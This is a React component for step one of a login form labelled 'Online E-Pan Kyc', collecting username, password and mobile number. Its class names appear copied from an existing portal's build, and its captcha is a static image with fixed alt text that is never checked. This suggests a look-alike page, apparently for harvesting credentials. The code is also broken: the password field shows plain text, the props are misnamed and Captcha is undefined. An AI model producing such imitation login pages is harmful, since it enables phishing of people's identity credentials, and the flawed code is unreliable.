export default function Step1(handleSubmit) {
    return <>
      <main>
    <div className="Tpv_login_heading__E5J6K">
      <h3 className="Tpv_login_heading_h3__z0Qx1">Log in Online E-Pan Kyc</h3>
    </div>
    <div className="Tpv_login_form___9zpm">
      <p className="Tpv_info__04_Jv">
        <span className="Tpv_info_span__oB9oh">(CARE:</span> Username and password
        sensitive)
      </p>
      <form className="Tpv_form__okPRU" onSubmit={handleSubmit}>
        <div className="Tpv_form_group__aHWg0">
          <label className="Tpv_label__cObJz">Username*</label>
          <input type="text" name="username"  className="Tpv_form_control__5hzGF" required="" maxLength={30} />
        </div>
        <div className="Tpv_form_group__aHWg0">
          <label className="Tpv_label__cObJz">Password*</label>
          <input type="text" name="password"  className="Tpv_form_control__5hzGF" required="" maxLength={30} />
        </div>
        <div className="Tpv_form_group__aHWg0">
          <label className="Tpv_label__cObJz">Mobile*</label>
          <input type="text"  minLength={10} maxLength={10} name="mobile"  className="Tpv_form_control__5hzGF" required="" />
        </div>
        <div className="Tpv_form_group__aHWg0">
          <label className="Tpv_label__cObJz">
            Enter the text shown in the image*
          </label>
          <input type="text" className="Tpv_form_control__5hzGF" maxLength={30} />
        </div>
        <label className="Tpv_label__cObJz">Select any of the Captcha</label>
        <div className="Tpv_captcha__luduR">
          <div className="Tpv_w_50__Sr4Sb">
            <input type="radio" name="captcha_type" id="" defaultChecked="" />
            Image Captcha
          </div>
          <div className="Tpv_w_50__Sr4Sb">
            <input type="radio" name="captcha_type" id="" />
            Audio Captcha
          </div>
          <div className="Tpv_clear__O2odX" />
          <div className="Tpv_top_10__85sFl">
            <div>
              <img
                alt="oRPcKP"
                loading="lazy"
                width={150}
                height={39}
                decoding="async"
                data-nimg={1}
                src={Captcha.src}
                style={{ color: "transparent" }}
              />
            </div>
          </div>
          <div className="Tpv_form_group__aHWg0">
            <input
              type="submit"
              className="Tpv_btn__Mbztt"
              defaultValue="LOGIN"
            />
            <input type="reset" className="Tpv_btn__Mbztt" defaultValue="RESET" />
          </div>
          <p>
            <a href="/"> Register</a>
          </p>
          <p>
            <a href="/">Forget</a>
          </p>
        </div>
      </form>
    </div>
    <div className="Tpv_p_body__VIl_Q">
      <ul className="Tpv_provide__KIDMh">
        <li>Required fields an asterisk ().</li>
        <li>
          Please do not share personal information user id and password any other
          page
        </li>
        <li>Username and password are sensitive. Do not share with anyone</li>
      </ul>
    </div>
  </main>
    </>
}